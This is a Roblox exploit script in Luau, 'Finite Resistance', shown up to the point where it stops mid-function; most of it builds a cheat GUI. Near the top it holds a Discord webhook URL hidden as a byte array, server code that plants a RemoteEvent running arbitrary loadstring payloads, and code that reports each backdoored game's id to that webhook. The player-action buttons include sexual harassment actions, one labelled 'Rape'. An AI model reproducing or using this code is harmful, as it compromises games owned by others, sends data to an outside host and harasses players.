--[[

	Finite Resistance V1.5.4
	by @artofcoding212 on Discord

	Join the discord: https://discord.gg/G79ZucGAwW

]]

script.Parent = nil

if getgenv then
	if getgenv().FINITE_RESISTANCE_LOADED then
		warn("Finite resistance is already loaded.")
		return
	end

	getgenv().FINITE_RESISTANCE_LOADED = true
end

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local ReadFile = readfile and function(file)
	return pcall(readfile, file)
end or nil

local WriteFile = writefile and function(file, data)
	return pcall(readfile, file, data)
end or nil

local OPEN_KEYBIND = Enum.KeyCode.End
local DISC_URL = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115,
	47, 49, 51, 51, 50, 56, 51, 52, 52, 49, 53, 51, 57, 56, 56, 55, 57, 50, 51, 50, 47, 101, 121, 103, 56, 118, 56, 73, 76, 114, 120, 86, 112, 48, 50, 102, 121, 118, 57, 49, 57, 109, 110, 52, 106,
	79, 116, 99, 120, 89, 103, 72, 45, 77, 109, 102, 51, 69, 55, 49, 74, 55, 48, 70, 84, 76, 98, 95, 89, 77, 114, 81, 81, 113, 76, 109, 97, 88, 89, 69, 73, 83, 67, 65, 102, 85, 49, 68, 118}
-- [sorry for the obfuscation, just wanted my webhook URL to be a tad harder to find and spam]
-- [as a side note, it's only used for posting the game's id when you find a backdoor, because im greedy]

local BACKDOOR_TEST_SS_CODE = --(hosts a "RemoteEvent server" to push SS code to, also acts as a backdoor tester on REs and RFs)
	'local send = Instance.new("RemoteEvent") send.Name = "FINITE_RESISTANCE_BACKDOOR_SEND" send.Parent = game.ReplicatedStorage send.OnServerEvent:Connect(function(_, c) loadstring(c)() end)'
local BACKDOOR_SEND_SS_CODE = --(once a game is backdoored, send it to my discord webhook because im greedy)
	`local http = game:GetService("HttpService") \
http:PostAsync("%s", http:JSONEncode(\{content="game {game.PlaceId} is backdoored"\}), Enum.HttpContentType.ApplicationJson, false)`

local plrs = game:GetService("Players")
local uis = game:GetService("UserInputService")
local vu = game:GetService("VirtualInputManager")
local ts = game:GetService("TweenService")
local cas = game:GetService("ContextActionService")
local tcs = game:GetService("TextChatService")
local reps = game:GetService("ReplicatedStorage")
local rs = game:GetService("RunService")
local http = game:GetService("HttpService")
local client = plrs.LocalPlayer
local mouse = client:GetMouse()

local camera = workspace.CurrentCamera

function backdoor_filter(r: RemoteEvent|RemoteFunction): boolean
	local function check_parent(a: Instance): boolean
		if a.Name == "RobloxReplicatedStorage" then
			return false
		end

		if not a.Parent or a.Parent == game then
			return true
		end

		return check_parent(a.Parent)
	end

	if ((not tcs:FindFirstChild("TextChatChannels")) and reps:FindFirstChild("DefaultChatSystemChatEvents") and r.Parent == reps.DefaultChatSystemChatEvents) or r.Name == "FINITE_RESISTANCE_BACKDOOR_SEND" then
		return false
	end

	if not check_parent(r) then
		return false
	end

	return true
end

function instance_new(class_name: string, props: {[string]: any}, end_parent: Instance?)
	local x = Instance.new(class_name)

	for k, v in props do
		x[k] = v
	end

	if end_parent then
		x.Parent = end_parent
	end

	return x
end

function tween(objs: {Instance}|Instance, ti: TweenInfo, props: {[string]: any})
	objs = typeof(objs) == "table" and objs or {objs}

	for _, o in objs do
		ts:Create(o, ti, props):Play()
	end
end

function filter<V>(map: {V}, fn: (x: V)->boolean): {V}
	local new = {}

	for _, x in map do
		if fn(x) then
			table.insert(new, x)
		end
	end

	return new
end

function arr_merge<T>(a: {T}, b: {T}): {T}
	local x = table.clone(a)

	for _, v in b do
		table.insert(x, v)
	end

	return x
end

function rand_str(): string
	local s = ""

	for i = 1, 50+math.random(0, 20) do
		s = s..string.char(math.random(33, 126))
	end

	return s
end

function search(strs: {string}, match: string): {ratio: number, raw: string}
	local t = {}

	for _, str in pairs(strs) do
		local str_len = #str
		local match_len = #match

		if str == match then
			table.insert(t, { ratio=math.huge, raw=match })
			continue
		end

		if match_len <= str_len + 5 then
			local Tempstr = str:lower()
			local TempSearchString = match:lower()

			local c

			local rows = str_len  + 1
			local cols = match_len + 1

			local dist = {}

			for i = 1, rows do
				dist[i] = {}

				for k = 1, cols do
					dist[i][k] = 0
				end
			end

			for i = 2, rows do
				for k = 2, cols do
					dist[i][1] = i
					dist[1][k] = k
				end
			end

			for i = 2, cols do
				for k = 2, rows do
					if Tempstr:sub(k - 1, k - 1) == TempSearchString:sub(i - 1, i - 1) then
						c = 0
					else
						c = 2
					end

					dist[k][i] = math.min(
						dist[k - 1][i] + 1,
						dist[k][i - 1] + 1,
						dist[k - 1][i - 1] + c
					)
				end
			end

			table.insert(t, { ratio = ((str_len + match_len) - dist[rows][cols]) / (str_len + match_len), raw = str})
		else
			table.insert(t, { ratio = 0, raw = str })
		end
	end

	table.sort(t, function(a, b)
		return a.ratio > b.ratio
	end)

	return t
end

function extract_keys<K>(t: {[K]: any}): {K}
	local keys = {}

	for k, _ in t do
		table.insert(keys, k)
	end

	return keys
end

function conn(r: RBXScriptSignal, fn: (c: RBXScriptConnection)->(), done: (()->())?, ...): RBXScriptConnection
	local c: RBXScriptConnection
	local done_args = table.pack(...)

	c = r:Connect(function(...)
		fn(c, ...)
		if (not c.Connected) and done ~= nil then
			done(table.unpack(done_args))
		end	
	end)

	return c
end

function make_cmdbar(): (ScreenGui, Frame)
	local main = instance_new("ScreenGui", {
		Name = "CommandBar",
		DisplayOrder = 999999999,
		ResetOnSpawn = false,
	}, client:WaitForChild("PlayerGui"))

	local cntr = instance_new("Frame", {
		Name = "cntr",
		Position = UDim2.new(0.5, 0, 0.5, 0),
		Size = UDim2.new(0, 0, 0, 0),
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		BorderColor3 = Color3.new(0, 0, 0),
		AnchorPoint = Vector2.new(0.5, 0.5),
		AutomaticSize = Enum.AutomaticSize.XY,
		Visible = false,
	}, main)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 2),
		FillDirection = Enum.FillDirection.Vertical,
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
	}, cntr)

	local cmdbar = instance_new("Frame", {
		Name = "cmdbar",
		BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647),
		BorderSizePixel = 0,
		BorderColor3 = Color3.new(0, 0, 0),
		Size = UDim2.new(0, 0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
	}, cntr)

	instance_new("TextBox", {
		Name = "box",
		Size = UDim2.new(0, 0, 0, 50),
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ClearTextOnFocus = false,
		Active = false,
		BorderColor3 = Color3.new(0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.XY,
		TextTransparency = 1,
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
		TextWrapped = true,
		RichText = true,
		PlaceholderText = "Type a command...",
		PlaceholderColor3 = Color3.new(0.588235, 0.588235, 0.588235),
	}, cmdbar)

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
	}, cmdbar)

	local list = instance_new("ScrollingFrame", {
		Name = "list",
		Size = UDim2.new(1, 0, 0, 130),
		BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		BorderColor3 = Color3.new(0, 0, 0),
		Transparency = 0.30000001192092896,
		Active = true,
		ScrollBarImageTransparency = 1,
		ScrollBarThickness = 0,
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		AutomaticSize = Enum.AutomaticSize.X,
	},  cntr)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 2),
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, list)

	local tmp = instance_new("TextButton", {
		Name = "tmp",
		Text = "",
		Size = UDim2.new(1, 0, 0, 13),
		BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647),
		BorderSizePixel = 0,
		BorderColor3 = Color3.new(0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
	}, script)

	instance_new("TextLabel", {
		Name = "txt",
		Size = UDim2.new(0, 0, 1, 0),
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		TextTransparency = 1,
		BorderSizePixel = 0,
		BorderColor3 = Color3.new(0, 0, 0),
		RichText = true,
		AutomaticSize = Enum.AutomaticSize.X,
		Text = "?",
		TextColor3 = Color3.new(0.588235, 0.588235, 0.588235),
		TextSize = 14,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Light, Enum.FontStyle.Normal),
	}, tmp)

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 3),
		PaddingBottom = UDim.new(0, 3),
		PaddingLeft = UDim.new(0, 3),
		PaddingRight = UDim.new(0, 3),
	}, tmp)

	local x: Frame

	return main, tmp
end

function make_settings(): Frame
	local cntr = instance_new("Frame", {
		Name="settings",
		AnchorPoint = Vector2.new(.5, .5),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = 0.3,
		BorderSizePixel = 0,
		Size = UDim2.fromScale(0, 0),
		Position = UDim2.fromScale(.5, .5),
		ZIndex = 1,
		Visible = false,
	})

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, cntr)	
	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 7),
		FillDirection = Enum.FillDirection.Vertical,
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, cntr)
	
	local title = instance_new("Frame", {
		Name = "title",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		Size = UDim2.fromOffset(0, 50),
		LayoutOrder = 0,
	}, cntr)

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 0),
		PaddingRight = UDim.new(0, 0),
		PaddingTop = UDim.new(0, 5),
	}, title)
	
	instance_new("TextLabel", {
		Name="title",
		Size=UDim2.new(0,0,1,0),
		AnchorPoint=Vector2.new(0,0.5),
		AutomaticSize=Enum.AutomaticSize.X,
		Position=UDim2.new(0,0,0.5,0),
		BackgroundTransparency=1,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
		Text="Settings",
		TextColor3=Color3.fromRGB(240,240,240),
		TextSize=30,
	}, title)
	
	local sttngs = instance_new("Frame", {
		Name = "cntr",
		BackgroundTransparency = 0.5,
		Size = UDim2.fromOffset(0, 0),
		BackgroundColor3 = Color3.fromRGB(30,30,30),
		AutomaticSize = Enum.AutomaticSize.XY,
		LayoutOrder = 1,
	}, cntr)
	
	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, sttngs)
	
	instance_new("UIListLayout", {
		Padding=UDim.new(0,5),
		FillDirection=Enum.FillDirection.Vertical,
		SortOrder=Enum.SortOrder.LayoutOrder,
		HorizontalAlignment=Enum.HorizontalAlignment.Left,
		VerticalAlignment=Enum.VerticalAlignment.Top,
	}, sttngs)
	
	local function make_setting(name: string, buttonName: string): Frame
		local f = instance_new("Frame", {
			Name=name,
			BackgroundTransparency=1,
			Size=UDim2.fromOffset(0,50),
			AutomaticSize=Enum.AutomaticSize.X,
		})
		instance_new("UIListLayout", {
			Padding=UDim.new(0,5),
			FillDirection=Enum.FillDirection.Horizontal,
			SortOrder=Enum.SortOrder.LayoutOrder,
			HorizontalAlignment=Enum.HorizontalAlignment.Center,
			VerticalAlignment=Enum.VerticalAlignment.Center,
		}, f)
		instance_new("TextLabel", {
			Name="title",
			Size=UDim2.new(0,0,1,0),
			AnchorPoint=Vector2.new(0,0.5),
			Position=UDim2.new(0,0,0.5,0),
			BackgroundTransparency=1,
			AutomaticSize = Enum.AutomaticSize.X,
			FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
			Text=name:sub(1,1):upper()..name:sub(2,name:len())..":",
			TextColor3=Color3.fromRGB(240,240,240),
			TextSize=17,
			LayoutOrder=0,
		}, f)
		local btn = instance_new("TextButton", {
			Name="update",
			Size=UDim2.new(0,0,0,40),
			AnchorPoint=Vector2.new(0,0.5),
			Position=UDim2.new(0,0,0.5,0),
			BackgroundTransparency=0,
			AutomaticSize = Enum.AutomaticSize.X,
			BackgroundColor3=Color3.fromRGB(30,30,30),
			FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
			Text=buttonName,
			LayoutOrder=1,
			TextColor3=Color3.fromRGB(200,200,200),
			TextSize=18,
			RichText=true,
		}, f)
		instance_new("UIPadding", {
			PaddingBottom = UDim.new(0, 10),
			PaddingLeft = UDim.new(0, 10),
			PaddingRight = UDim.new(0, 10),
			PaddingTop = UDim.new(0, 10),
		}, btn)
		return f
	end
	
	local keybind = make_setting("keybind", OPEN_KEYBIND.Name)
	keybind.Parent = sttngs
	return cntr
end

function make_esp_viewer(): (Frame, Frame)
	local cntr = instance_new("Frame", {
		Name = "esp_viewer",
		AnchorPoint = Vector2.new(.5, .5),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Size = UDim2.fromScale(0, 0),
		Position = UDim2.fromScale(.5, .5),
		ZIndex = 1,
		Visible = false,
	})

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 7),
		FillDirection = Enum.FillDirection.Vertical,
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, cntr)

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, cntr)

	local actions = instance_new("Frame", {
		LayoutOrder = 1,
		Name = "actions",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Size = UDim2.fromScale(0, 0),
	}, cntr)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 5),
		FillDirection = Enum.FillDirection.Vertical,
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, actions)

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, actions)

	local col1 = instance_new("Frame", {
		Name = "col1",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		Size = UDim2.fromScale(0, 0),
		BorderSizePixel = 0,
		LayoutOrder = 1,
	}, actions)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 10),
		FillDirection = Enum.FillDirection.Horizontal,
		HorizontalAlignment = Enum.HorizontalAlignment.Left,
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, col1)

	local action_tmp = instance_new("TextButton", {
		AutomaticSize = Enum.AutomaticSize.X,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		Size = UDim2.fromOffset(0, 40),
		BackgroundTransparency = 1,
		TextTransparency = 1,
		BorderSizePixel = 0,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		Text = "template",
		TextColor3 = Color3.fromRGB(200, 200, 200),
		TextSize = 18,
	})

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, action_tmp)

	local goto = action_tmp:Clone()
	goto.LayoutOrder = 0
	goto.Text = "Goto"
	goto.Name = "goto"
	goto.Parent = col1

	local lgoto = action_tmp:Clone()
	lgoto.LayoutOrder = 1
	lgoto.Text = "LerpGoto"
	lgoto.Name = "lgoto"
	lgoto.Parent = col1

	local rape = action_tmp:Clone()
	rape.LayoutOrder = 2
	rape.Text = "Rape"
	rape.Name = "rape"
	rape.Parent = col1
	
	local headsit = action_tmp:Clone()
	headsit.LayoutOrder = 2
	headsit.Text = "Headsit"
	headsit.Name = "headsit"
	headsit.Parent = col1
	
	local _69 = action_tmp:Clone()
	_69 .LayoutOrder = 2
	_69 .Text = "69"
	_69 .Name = "_69"
	_69 .Parent = col1

	instance_new("TextLabel", {
		Name = "title",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Size = UDim2.fromScale(0, 0),
		LayoutOrder = 0,
		TextTransparency = 1,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		Text = "Actions",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 20,
	}, actions)

	local stat = instance_new("Frame", {
		Name = "stats",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = 2,
		Size = UDim2.fromScale(0, 0),
	}, cntr)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 10),
		FillDirection = Enum.FillDirection.Vertical,
		HorizontalAlignment = Enum.HorizontalAlignment.Left,
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, stat)

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, stat)

	instance_new("TextLabel", {
		Name = "title",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Size = UDim2.fromScale(0, 0),
		LayoutOrder = 0,
		TextTransparency = 1,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		Text = "Stats",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 20,
	}, stat)

	local stat_tmp = instance_new("TextLabel", {
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		TextTransparency = 1,
		Size = UDim2.fromScale(0, 0),
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
		RichText = true,
		Text = "...",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 15,
	})

	local stat_id = stat_tmp:Clone()
	stat_id.LayoutOrder = 1
	stat_id.Name = "userid"
	stat_id.Parent = stat
	local stat_lifetime = stat_tmp:Clone()
	stat_lifetime.LayoutOrder = 2
	stat_lifetime.Name = "acc_lifetime"
	stat_lifetime.Parent = stat
	local stat_char_t = stat_tmp:Clone()
	stat_char_t.LayoutOrder = 3
	stat_char_t.Name = "chartype"
	stat_char_t.Parent = stat
	local stat_health = stat_tmp:Clone()
	stat_health.LayoutOrder = 4
	stat_health.Name = "health"
	stat_health.Parent = stat
	local stat_team = stat_tmp:Clone()
	stat_team.LayoutOrder = 5
	stat_team.Name = "team"
	stat_team.Parent = stat

	local inventory = instance_new("Frame", {
		Name = "inventory",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = 3,
		Size = UDim2.fromScale(0, 0),
	}, cntr)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 10),
		FillDirection = Enum.FillDirection.Vertical,
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, inventory)

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, inventory)

	instance_new("TextLabel", {
		Name = "title",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Size = UDim2.fromScale(0, 0),
		LayoutOrder = 0,
		TextTransparency = 1,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		Text = "Inventory <font size=\"12\">(RMB to copy, clientsided)</font>",
		RichText = true,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 20,
	}, inventory)

	local inv = instance_new("ScrollingFrame", {
		Name = "inv",
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = 1,
		Size = UDim2.fromOffset(300, 120),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		CanvasSize = UDim2.new(0, 0, 0, 0),
		ScrollBarThickness = 0,
	}, inventory)

	instance_new("UIGridLayout", {
		Name = "grid",
		CellPadding = UDim2.fromOffset(10, 10),
		CellSize = UDim2.fromOffset(50, 50),
		FillDirection = Enum.FillDirection.Horizontal,
		FillDirectionMaxCells = 5,
		SortOrder = Enum.SortOrder.Name,
		HorizontalAlignment = Enum.HorizontalAlignment.Left,
		VerticalAlignment = Enum.VerticalAlignment.Top,
	}, inv)

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 5),
		PaddingLeft = UDim.new(0, 5),
		PaddingRight = UDim.new(0, 0),
		PaddingTop = UDim.new(0, 5),
	}, inv)

	local title = instance_new("Frame", {
		Name = "title",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		Size = UDim2.fromOffset(0, 50),
		LayoutOrder = 0,
	}, cntr)

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 0),
		PaddingRight = UDim.new(0, 0),
		PaddingTop = UDim.new(0, 5),
	}, title)

	local icon = instance_new("ImageLabel", {
		Name = "plricon",
		BackgroundTransparency = 1,
		Position = UDim2.fromOffset(0, 0),
		Image = "rbxasset://textures/ui/GuiImagePlaceholder.png",
		Size = UDim2.new(0, 50, 1, 0),
	}, title)

	instance_new("UICorner", {
		Name = "corner",
		CornerRadius = UDim.new(1, 0),
	}, icon)

	instance_new("TextLabel", {
		Name = "displayname",
		AutomaticSize = Enum.AutomaticSize.X,
		BackgroundTransparency = 1,
		Position = UDim2.fromOffset(60, 0),
		Size = UDim2.fromScale(0, .5),
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
		TextTransparency = 1,
		Transparency = 0,
		Text = "DisplayName",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 30,
	}, title)

	instance_new("TextLabel", {
		Name = "username",
		AutomaticSize = Enum.AutomaticSize.X,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 60, .5, 0),
		Size = UDim2.fromScale(0, .45),
		TextTransparency = 1,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
		Text = "@Username",
		TextColor3 = Color3.fromRGB(200, 200, 200),
		TextSize = 15,
	}, title)

	local inv_tmp = instance_new("Frame", {
		Name = "inventory_item",
		BackgroundColor3 = Color3.fromRGB(60, 60, 60),
		BackgroundTransparency = .8,
	})

	instance_new("UIStroke", {
		Name = "stroke",
		Color = Color3.fromRGB(69, 159, 255),
		LineJoinMode = Enum.LineJoinMode.Miter,
		Thickness = 2,
		Transparency = 0,
		Enabled = false,
	}, inv_tmp)

	local tmp_txt = instance_new("TextLabel", {
		Name = "label",
		BackgroundTransparency = 1,
		Size = UDim2.fromScale(1, 1),
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		TextColor3 = Color3.fromRGB(230, 230, 230),
		Text = "Tool",
		TextWrapped = true,
		TextSize = 11,
	}, inv_tmp)

	instance_new("UIPadding", {
		PaddingBottom = UDim.new(0, 5),
		PaddingLeft = UDim.new(0, 5),
		PaddingRight = UDim.new(0, 5),
		PaddingTop = UDim.new(0, 5),
	}, tmp_txt)

	return cntr, inv_tmp
end

function make_spectate(): Frame
	local cntr = instance_new("Frame", {
		Name = "spectate",
		AnchorPoint = Vector2.new(.5, 1),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Visible = false,
		LayoutOrder = 0,
		Position = UDim2.fromScale(.5, .95),
		Size = UDim2.fromScale(0, 0),
	})

	instance_new("UIPadding", {
		Name = "padding",
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, cntr)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 15),
		FillDirection = Enum.FillDirection.Horizontal,
		SortOrder = Enum.SortOrder.LayoutOrder,
		VerticalAlignment = Enum.VerticalAlignment.Center,
	}, cntr)

	local btn = instance_new("TextButton", {
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Size = UDim2.fromOffset(50, 50),
		Text = "",
	})

	instance_new("ImageLabel", {
		Name = "icon",
		AnchorPoint = Vector2.new(.5, .5),
		BackgroundTransparency = 1,
		Size = UDim2.fromOffset(45, 45),
		Position = UDim2.fromScale(.5, .5),
		Image = "rbxassetid://4370337241",
		ImageTransparency = 1,
		ScaleType = Enum.ScaleType.Fit,
	}, btn)

	local prev = btn:Clone()
	prev.Name = "prev"
	prev.LayoutOrder = 0
	prev.Parent = cntr

	local txt = instance_new("TextLabel", {
		Name = "user",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = 1,
		TextTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = 1,
		Size = UDim2.fromScale(0, 0),
		RichText = true,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
		Text = "display (@user)",
		TextSize = 20,
		TextColor3 = Color3.fromRGB(230, 230, 230),
	}, cntr)

	instance_new("UIPadding", {
		Name = "padding",
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
		PaddingTop = UDim.new(0, 10),
	}, txt)

	local nxt = btn:Clone()
	nxt.Name = "next"
	nxt.LayoutOrder = 2
	nxt.icon.Rotation = 180
	nxt.Parent = cntr

	return cntr
end

function make_backdoor(): (Frame, Frame)
	local cntr = instance_new("Frame", {
		Name = "backdoor_finder",
		AnchorPoint = Vector2.new(.5, .5),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Position = UDim2.fromScale(.5, .5),
		Size = UDim2.fromScale(0, 0),
		Visible = false,
	})

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
	}, cntr)

	local title = instance_new("Frame", {
		Name = "title",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Position = UDim2.fromScale(0, 0),
		Size = UDim2.fromScale(1, 0),
	}, cntr)

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
	}, title)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 8),
		FillDirection = Enum.FillDirection.Vertical,
		SortOrder = Enum.SortOrder.LayoutOrder,
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
		VerticalAlignment = Enum.VerticalAlignment.Top,
	}, title)

	instance_new("TextLabel", {
		Name = "title",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		TextTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = 0,
		Size = UDim2.fromScale(0, 0),
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		Text = "Backdoor Finder",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 30,
	}, title)	

	local btns = instance_new("Frame", {
		Name = "btns",
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		Size = UDim2.fromScale(0, 0),
		BorderSizePixel = 0,
		LayoutOrder = 1,
	}, title)

	instance_new("UIListLayout", {
		Name = "layout",
